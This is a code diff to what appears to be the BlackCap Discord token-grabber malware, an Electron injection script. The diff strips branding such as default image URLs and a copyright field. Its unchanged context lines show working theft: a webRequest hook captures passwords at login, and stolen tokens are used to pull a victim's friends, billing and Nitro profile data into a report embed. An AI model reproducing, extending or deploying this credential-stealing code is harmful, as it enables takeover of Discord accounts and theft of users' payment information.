@@ -284,8 +284,7 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
+
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -461,8 +460,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -470,16 +467,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var Friends = parseFriends(friends)
 
     switch (true) {
-
-
-
-
-
-
-
-
-
-
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
@@ -516,10 +503,6 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 }, {
                     name: "A2F <a:a2f:1040272766982692885>",
                     value: `${GetA2F(user.mfa_enabled)}`,
-                    inline: !0
-                }, {
-                    name: "@Copyright",
-                    value: `[BlackCap 2023 <a:blackcapgif:1041634542093619260>](https://github.com/Red60sapphire/BuckledPepper-Grabber)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
